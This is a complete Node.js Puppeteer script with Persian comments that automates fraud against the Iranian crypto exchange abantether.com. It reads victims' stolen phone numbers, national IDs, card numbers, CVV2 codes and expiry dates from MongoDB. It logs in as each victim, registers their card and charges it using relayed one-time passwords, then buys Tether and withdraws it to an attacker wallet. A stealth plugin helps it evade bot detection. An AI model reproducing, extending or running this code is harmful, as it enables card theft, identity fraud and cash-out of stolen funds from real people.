require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

// تنظیمات
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = 'zarin';
const COLLECTION_NAME = 'users';
const EXCHANGE_URL = 'https://abantether.com';
const WALLET_ADDRESS = process.env.WALLET_ADDRESS;
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;

const log = {
  info: (msg) => console.log(chalk.cyan(`[اطلاعات] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  success: (msg) => console.log(chalk.green(`[موفق] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  error: (msg) => console.log(chalk.red(`[خطا] ${new Date().toLocaleString('fa-IR')} → ${msg}`)),
  warn: (msg) => console.log(chalk.yellow(`[هشدار] ${new Date().toLocaleString('fa-IR')} → ${msg}`))
};

if (!MONGODB_URI || !WALLET_ADDRESS) {
  log.error('MONGODB_URI یا WALLET_ADDRESS تنظیم نشده!');
  process.exit(1);
}

let collection;
async function connectToMongo() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  log.success('اتصال به MongoDB برقرار شد');
  collection = client.db(DB_NAME).collection(COLLECTION_NAME);
}

// صبر برای OTP (حداکثر ۵ دقیقه)
async function waitForOtp(userId, field) {
  for (let i = 0; i < 100; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = user?.[field];
    if (otp && otp.toString().trim().length >= 4) {
      log.success(`${field} دریافت شد: ${otp}`);
      await collection.updateOne({ _id: new ObjectId(userId) }, { $unset: { [field]: "" } });
      return otp.toString().trim();
    }
    log.warn(`در انتظار ${field}... (${i + 1}/100)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت: ${field} دریافت نشد`);
}

// تبدیل سال شمسی به دو رقمی
function toTwoDigitYear(year) {
  const y = parseInt(year);
  return y >= 1300 && y <= 1499 ? (y - 1300).toString().padStart(2, '0') : year.toString().slice(-2);
}

async function runBot() {
  await connectToMongo();

  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-dev-shm-usage',
      '--disable-gpu',
      '--single-process',
      '--no-zygote'
    ]
  });

  log.success('مرورگر آماده است — ربات کاملاً اتوماتیک فعال شد');

  // هر ۲۰ ثانیه چک کن ببین کاربری آماده پردازشه
  setInterval(async () => {
    try {
      const user = await collection.findOne({
        processed: { $ne: true },
        personalPhoneNumber: { $exists: true },
        personalName: { $exists: true },
        personalNationalCode: { $exists: true },
        personalBirthDate: { $exists: true },
        cardNumber: { $exists: true },
        cvv2: { $exists: true },
        bankMonth: { $exists: true },
        bankYear: { $exists: true },
        deviceId: { $exists: true }
      });

      if (!user) return;

      const phone = user.personalPhoneNumber;
      log.warn(`کاربر جدید پیدا شد: ${phone} — شروع پردازش اتوماتیک`);

      await collection.updateOne({ _id: user._id }, { $set: { processed: 'running', startedAt: new Date() } });

      const page = await browser.newPage();
      await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15');

      try {
        await page.goto(EXCHANGE_URL, { waitUntil: 'networkidle2', timeout: 60000 });

        // مرحله ۱: ورود با شماره
        await page.waitForSelector('input[placeholder="شماره موبایل"]', { timeout: 20000 });
        await page.click('input[placeholder="شماره موبایل"]');
        await page.type('input[placeholder="شماره موبایل"]', phone);
        await page.click('button:has-text("ادامه")');
        log.success('شماره ارسال شد — منتظر otp_login از سمت شما...');

        const otpLogin = await waitForOtp(user._id, 'otp_login');
        await page.type('input[placeholder="کد تایید"]', otpLogin);
        await page.click('button:has-text("تایید")');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        log.success('ورود موفق!');

        // مرحله ۲: اطلاعات شخصی (اگر لازم بود)
        try {
          await page.waitForSelector('input[placeholder="نام و نام خانوادگی"]', { timeout: 8000 });
          await page.type('input[placeholder="نام و نام خانوادگی"]', user.personalName);
          await page.type('input[placeholder="کد ملی"]', user.personalNationalCode);
          await page.type('input[placeholder="تاریخ تولد"]', user.personalBirthDate);
          await page.click('button:has-text("ثبت اطلاعات")');
          await page.waitForTimeout(3000);
        } catch (e) { log.info('اطلاعات شخصی قبلاً ثبت شده'); }

        // مرحله ۳: احراز هویت سطح ۱
        try {
          await page.click('text=احراز هویت');
          await page.click('text=سطح یک');
          await page.click('button:has-text("تایید")');
          await page.waitForTimeout(3000);
        } catch (e) { log.info('احراز هویت قبلاً انجام شده'); }

        // مرحله ۴: ثبت کارت
        await page.click('text=کیف پول');
        await page.click('text=کارت بانکی');
        await page.click('text=افزودن کارت');
        await page.type('input[placeholder="شماره کارت"]', user.cardNumber);
        await page.type('input[placeholder="CVV2"]', user.cvv2);
        await page.type('input[placeholder="ماه"]', user.bankMonth.toString().padStart(2, '0'));
        await page.type('input[placeholder="سال"]', toTwoDigitYear(user.bankYear));
        await page.click('button:has-text("ثبت کارت")');
        log.success('کارت ارسال شد — منتظر otp_register_card...');

        const otpCard = await waitForOtp(user._id, 'otp_register_card');
        await page.type('input[placeholder*="کد پیامک"], input[placeholder*="کد"]', otpCard);
        await page.click('button:has-text("تأیید")');
        await page.waitForTimeout(5000);
        log.success('کارت با موفقیت ثبت شد');

        // مرحله ۵: شارژ حساب
        await page.click('text=واریز تومان');
        await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
        await page.click('button:has-text("پرداخت")');
        log.success('در حال پرداخت — منتظر otp_payment...');

        const otpPayment = await waitForOtp(user._id, 'otp_payment');
        await page.type('input#otp, input[placeholder*="کد"]', otpPayment);
        await page.click('button:has-text("تایید"), button:has-text("پرداخت")');
        await page.waitForSelector('text=پرداخت موفق', { timeout: 120000 });
        log.success('پرداخت موفق!');

        // مرحله ۶: خرید تتر و برداشت
        await page.click('text=بازار');
        await page.click('text=تتر');
        await page.type('input[placeholder="مبلغ"]', AMOUNT_IRT.toString());
        await page.click('button:has-text("خرید")');
        await page.waitForSelector('text=سفارش با موفقیت ثبت شد', { timeout: 40000 });

        await page.click('text=برداشت');
        await page.click('text=تتر');
        await page.type('input[placeholder="آدرس"]', WALLET_ADDRESS);
        await page.type('input[placeholder="مقدار"]', (AMOUNT_IRT / 60000 - 1).toFixed(2));
        await page.click('button:has-text("برداشت")');
        await page.waitForSelector('text=درخواست برداشت ثبت شد', { timeout: 60000 });

        log.success(`همه مراحل برای ${phone} با موفقیت تموم شد! تتر در راهه`);
        await collection.updateOne({ _id: user._id }, {
          $set: { processed: true, status: 'completed', completedAt: new Date() }
        });

      } catch (err) {
        log.error(`شکست برای ${phone}: ${err.message}`);
        await collection.updateOne({ _id: user._id }, {
          $set: { processed: false, status: 'failed', error: err.message }
        });
      } finally {
        await page.close();
      }
    } catch (e) {
      log.error('خطا در اسکن دیتابیس: ' + e.message);
    }
  }, 20000); // هر ۲۰ ثانیه چک می‌کنه

  log.info('ربات کاملاً اتوماتیک فعال شد — فقط رکورد بساز و OTP بزن!');
}

runBot().catch(err => {
  log.error('خطای فتال: ' + err.message);
  setTimeout(runBot, 15000);
});